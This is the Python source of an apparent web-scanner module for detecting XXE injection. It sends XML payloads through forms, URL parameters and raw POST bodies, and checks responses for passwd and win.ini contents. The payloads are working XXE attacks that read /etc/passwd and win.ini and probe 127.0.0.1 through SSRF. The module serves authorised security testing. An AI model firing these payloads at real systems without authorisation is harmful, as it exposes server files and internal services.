"""XXE (XML External Entity) Detection Module."""

import re
from modules.base import BaseModule
from lib.logger import log


class XXEModule(BaseModule):
    """Detect XML External Entity injection vulnerabilities."""

    name = "xxe"
    description = "XXE detection via XML injection in request bodies and parameters"

    BASIC_XXE = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    PARAMETER_XXE = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'
    SSRF_XXE = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><root>&xxe;</root>'

    XXE_INDICATORS = [
        "root:x:", "root:0:0", "daemon:",
        "[boot loader]", "[fonts]",
        "root:", "bin/bash", "/sbin/nologin",
    ]

    def run(self, param_urls, forms):
        for form in forms:
            self._test_form(form)
        for url in param_urls:
            params = self.get_params(url)
            for param in params:
                self._test_param(url, param)
        for url in param_urls[:20]:
            self._test_raw_xml(url)
        return self.findings

    def _test_form(self, form):
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]
        for inp in inputs:
            if inp["type"] in ("submit", "button", "radio", "checkbox"):
                continue
            if inp["type"] in ("text", "textarea", "hidden"):
                self.delay()
                data = {}
                for field in inputs:
                    data[field["name"]] = self.BASIC_XXE if field["name"] == inp["name"] else field.get("value", "test")
                try:
                    resp = self.client.post(action, data=data) if method == "POST" else self.client.get(action, params=data)
                    if self._check(resp.text):
                        self.add_finding("xxe", action, inp["name"], "critical",
                            "XXE in form field", "file:///etc/passwd", "XXE via form input")
                        return
                except Exception:
                    pass

    def _test_param(self, url, param):
        self.delay()
        test_url = self.inject_param(url, param, self.BASIC_XXE)
        try:
            resp = self.client.get(test_url)
            if self._check(resp.text):
                self.add_finding("xxe", url, param, "critical",
                    "XXE via URL parameter", "file:///etc/passwd", "XXE via query param")
                return
        except Exception:
            pass

    def _test_raw_xml(self, url):
        for payload, desc in [(self.BASIC_XXE, "passwd"), (self.SSRF_XXE, "ssrf")]:
            self.delay()
            for ct in ["application/xml", "text/xml"]:
                try:
                    resp = self.client.post(url, data=payload, headers={"Content-Type": ct})
                    if self._check(resp.text):
                        self.add_finding("xxe", url, "body", "critical",
                            f"XXE via raw XML ({desc})", payload[:200], f"XXE via {ct} POST")
                        return
                except Exception:
                    pass

    def _check(self, text):
        return any(ind in text for ind in self.XXE_INDICATORS)
